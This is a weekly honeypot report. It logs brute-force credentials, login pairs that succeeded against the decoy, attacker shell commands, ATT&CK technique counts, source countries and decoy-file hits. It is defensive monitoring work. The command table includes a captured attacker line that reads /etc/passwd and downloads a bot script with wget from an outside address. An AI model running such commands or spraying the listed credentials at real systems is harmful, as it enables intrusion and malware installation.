# Arapuca weekly report, 2026-W46

_Generated 2026-11-09 16:49 UTC from the sensor's own telemetry._

## Summary

- **192,372 events** from **1,452 distinct addresses** across **49,967 sessions** (first week with data).
- **0 new samples** captured and quarantined.
- **4 download attempts refused** by the address policy.

## Credentials tried

These are the passwords being sprayed at the internet right now. The
honeypot accepts only a short list, so most of these failed and were
recorded anyway: a refused login is as much of a product as an accepted
one.

### Passwords

| password | attempts |
|---|---:|
| `(empty)` | 43,127 |
| `123456` | 2,355 |
| `123` | 1,190 |
| `1234` | 911 |
| `12345678` | 601 |
| `1` | 529 |
| `password` | 522 |
| `root` | 522 |
| `12345` | 443 |
| `123456789` | 324 |
| `admin` | 278 |
| `123123` | 229 |
| `P@ssw0rd` | 220 |
| `1qaz@WSX` | 204 |
| `abc123` | 198 |


### Usernames

| username | attempts |
|---|---:|
| `root` | 30,129 |
| `ubuntu` | 6,952 |
| `admin` | 2,974 |
| `user` | 1,598 |
| `deploy` | 1,381 |
| `test` | 973 |
| `user1` | 648 |
| `claude` | 586 |
| `debian` | 504 |
| `postgres` | 495 |
| `support` | 452 |
| `minecraft` | 444 |
| `dev` | 430 |
| `Tronlong` | 396 |
| `ftpuser` | 395 |


### Credentials that worked

Pairs that matched the weak credential list, meaning the session reached
the fake shell. These are the sessions worth reading.

| username / password | sessions |
|---|---:|
| `support / support` | 155 |
| `root / admin` | 87 |
| `root / 123456` | 74 |
| `admin / admin` | 73 |
| `root / 1234` | 63 |
| `root / 12345` | 60 |
| `root / 123456789` | 54 |
| `root / password` | 51 |
| `root / root` | 51 |
| `admin / 123456` | 48 |


## What they did once inside

| command | times |
|---|---:|
| `uname -s -v -n -r -m` | 809 |
| `/bin/./uname -s -v -n -r -m` | 30 |
| `echo xsec` | 5 |
| `whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh` | 4 |
| `uname -s -m` | 3 |
| `sh -s` | 2 |
| `echo 'check_1d8f5dd7c09726c226254f96b118859b_small_pid\|'"$$"` | 1 |
| `echo 'check_ab717ab7e50ff888c69beaf68024b6ed_small_pid\|'"$$"` | 1 |
| `sh -c 'printf '"'"'\n%s\|%s\n'"'"' '"'"'check_79b42571afcb4d654cca4bb2f03b66b3_small_control'"'"' '"'"'check_79b42571afcb4d654cca4bb2f03b66b3'"'"''` | 1 |
| `echo; echo 'check_ca42f927f553187d1a0351face6cdae8_transport_done'` | 1 |
| `set -- 'check_6e0ba67d6b038ba770ef870822bc6099_arg1' 'check_6e0ba67d6b038ba770ef870822bc6099_arg2'; echo 'check_6e0ba67d6b038ba770ef870822bc6099_small_positional\|'"$#\|$1\|$2"` | 1 |
| `sh -c 'set -- '"'"'check_e40173c75df564d76691fa3c34cc33f0_arg1'"'"' '"'"'check_e40173c75df564d76691fa3c34cc33f0_arg2'"'"'; printf '"'"'\n%s\|%s\n'"'"' '"'"'check_e40173c75df564d76691fa3c34cc33f0_small_positional'"'"' "$#\|$1\|$2"'` | 1 |
| `sh -c 'f_check_f6d23119fb6eaacbf5355a067d4efd4f() { printf '"'"'\n%s\|%s\n'"'"' '"'"'check_f6d23119fb6eaacbf5355a067d4efd4f_small_function'"'"' "$1\|$#"; }; f_check_f6d23119fb6eaacbf5355a067d4efd4f '"'"'check_f6d23119fb6eaacbf5355a067d4efd4f_function_value'"'"''` | 1 |
| `echo 'check_05abb79c7413ccc1859be6d9c827c546_small_control\|check_05abb79c7413ccc1859be6d9c827c546'` | 1 |
| `sh -c 'printf '"'"'\n%s\|%s\n'"'"' '"'"'check_e19c25c4b0bf3e6f6981b08ed63ab0b5_small_pid'"'"' "$$"'` | 1 |
| `sh -c 'printf '"'"'\n%s\|%s\n'"'"' '"'"'check_973fe2c734621c8516989a03e6c883e6_small_control'"'"' '"'"'check_973fe2c734621c8516989a03e6c883e6'"'"''` | 1 |
| `echo 'check_e8690f7dfccd4a613f99172c0ba71da3_small_pid\|'"$$"` | 1 |
| `set -- 'check_d8c401fffbe89cdb0f2c9f6133bd1e6b_arg1' 'check_d8c401fffbe89cdb0f2c9f6133bd1e6b_arg2'; echo 'check_d8c401fffbe89cdb0f2c9f6133bd1e6b_small_positional\|'"$#\|$1\|$2"` | 1 |
| `sh -c 'f_check_d7e9bfb57dc518fe9ab5a29fdaee22a7() { printf '"'"'\n%s\|%s\n'"'"' '"'"'check_d7e9bfb57dc518fe9ab5a29fdaee22a7_small_function'"'"' "$1\|$#"; }; f_check_d7e9bfb57dc518fe9ab5a29fdaee22a7 '"'"'check_d7e9bfb57dc518fe9ab5a29fdaee22a7_function_value'"'"''` | 1 |
| `f_check_57cd85fe6e37944aecc4cb9d3d4cb088() { echo 'check_57cd85fe6e37944aecc4cb9d3d4cb088_small_function\|'"$1\|$#"; }; f_check_57cd85fe6e37944aecc4cb9d3d4cb088 'check_57cd85fe6e37944aecc4cb9d3d4cb088_function_value'` | 1 |


### Commands the shell does not implement

Automated traffic repeats itself, so an unrecognised command usually
means a person or a toolkit not seen here before. Worth implementing the
common ones: a shell that answers more convincingly keeps attackers
longer.

| command | times |
|---|---:|
| `set` | 494 |
| `/bin/./uname` | 30 |
| `f_check_a97c57c4ee137a0aa66cf8cbd656c23e()` | 1 |
| `f_check_372dd68de24df7082d56bceb59ce9fde()` | 1 |
| `f_check_d887d5f0003d5ad1b4ad8eb000be4e35()` | 1 |
| `f_check_f1c9efc9205ced39c72fd6702ce56eb0()` | 1 |
| `f_check_f3eb25c5ee4d60b6db0cf6f358905fa5()` | 1 |
| `f_check_0efae46e64afdfd7198ffda4813db812()` | 1 |
| `f_check_c3689b2266009327b48f2c85a06fd299()` | 1 |
| `f_check_503aca1b53e9cde1187a911e1e9c7653()` | 1 |
| `f_check_11a953123c01d5937af342a507701bba()` | 1 |
| `f_check_e5d81d89e0e8136150b7439e8d5bd532()` | 1 |
| `f_check_e7cd60964287e672eee571e471990a9b()` | 1 |
| `f_check_03af6c8e56851fbcf0e01e23002cb5d4()` | 1 |
| `f_check_5f93332a7d0e46609651650272b97932()` | 1 |


## MITRE ATT&CK

| technique | events |
|---|---:|
| `T1110 / Brute Force` | 87,276 |
| `T1059.004 / Command and Scripting Interpreter: Unix Shell` | 3,100 |
| `T1552.001 / Credentials In Files` | 1,000 |
| `T1082 / System Information Discovery` | 896 |
| `T1021.004 / Remote Services: SSH` | 257 |
| `T1105 / Ingress Tool Transfer` | 104 |
| `T1003.008 / OS Credential Dumping: /etc/passwd and /etc/shadow` | 7 |
| `T1087.001 / Account Discovery: Local Account` | 5 |


## Where from

| country | events |
|---|---:|
| `The Netherlands` | 108,010 |
| `France` | 41,878 |
| `Iran` | 8,956 |
| `Philippines` | 8,548 |
| `Andorra` | 5,581 |
| `United States` | 5,458 |
| `United Kingdom` | 2,743 |
| `Switzerland` | 2,303 |
| `Germany` | 1,951 |
| `Belgium` | 941 |
| `China` | 792 |
| `Brazil` | 694 |
| `Turkey` | 640 |
| `Vietnam` | 569 |
| `Singapore` | 339 |


## Sessions

| classification | sessions |
|---|---:|
| `unknown` | 43,207 |
| `bot` | 6 |


Classification is by rhythm, not content: a script pastes commands at
machine speed with almost no variation, a person pauses to read, mistypes
and uses the line editor. `unknown` means the session was too short to
carry evidence either way, which is most of them.

## Decoy files taken

Whoever took these credentials will use them somewhere, and that use is
visible from elsewhere. Every value in them is fabricated.

| decoy | hits |
|---|---:|
| `login-form` | 1,088 |
| `env` | 138 |
| `git-config` | 31 |
| `backup-sql` | 8 |
| `config-php` | 6 |
| `aws-credentials` | 3 |
| `docker-compose` | 3 |
| `server-status` | 2 |


## Samples captured

_No new samples this week._

## Refused by the honeypot's own limits

### Download attempts to blocked ranges

An attacker aiming the honeypot at a private range or at the cloud
metadata service. The address is checked after resolution and before
every connect, so none of these reached anything.

| range | attempts |
|---|---:|
| `reserved` | 4 |


### SSH channel requests refused

Port forwarding and subsystem requests. Someone wanted a proxy or a file
transfer, not a shell.

| request type | attempts |
|---|---:|
| `direct-tcpip` | 246 |
| `subsystem` | 11 |


---

Generated by `tools/weekly_report.py`. Every figure comes from events this
sensor recorded itself.
